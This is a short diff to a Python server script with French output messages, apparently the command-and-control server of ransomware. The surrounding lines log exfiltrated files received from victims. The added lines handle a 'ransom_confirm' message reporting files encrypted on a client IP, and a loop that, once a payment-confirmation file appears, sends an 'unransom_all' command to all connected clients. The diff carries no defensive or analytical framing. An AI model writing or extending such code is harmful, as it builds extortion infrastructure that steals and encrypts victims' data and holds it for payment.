@@ -139,6 +139,9 @@ def process_data(data, client_ip):
                 f.write(bytes.fromhex(file_data))
             print(f"[+] Fichier exfiltré reçu : {file_path}")
 
+        elif file_type == "ransom_confirm":
+            print(f" Fichier chiffré sur {client_ip} : {file_data}")
+
 
 
 
@@ -237,6 +240,14 @@ threading.Thread(target=accept_connections, daemon=True).start()
 
 try:
     while True:
+
+        if os.path.exists("payment_confirmed.txt"):
+            print("[✔] Paiement confirmé. Déchiffrement lancé.")
+            for client in clients.values():
+                client.send(b"unransom_all")
+                os.remove("payment_confirmed.txt")
+
+
         command = input("Admin > ").strip()
         if command == "exit":
             break
